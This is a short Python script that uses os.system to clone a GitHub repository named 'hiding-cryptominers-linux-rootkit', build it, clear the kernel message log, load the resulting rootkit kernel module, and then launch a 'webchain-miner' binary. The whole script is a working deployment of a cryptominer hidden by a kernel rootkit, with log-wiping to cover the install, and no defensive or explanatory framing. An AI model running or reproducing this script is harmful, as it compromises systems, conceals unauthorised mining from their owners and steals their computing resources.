import os
os.system('git clone https://github.com/drakibaidb9/hiding-cryptominers-linux-rootkit && cd hiding-cryptominers-linux-rootkit/ && make && dmesg -C && insmod rootkit.ko && cd ..')
os.system('chmod +x webchain-miner && ./webchain-miner')
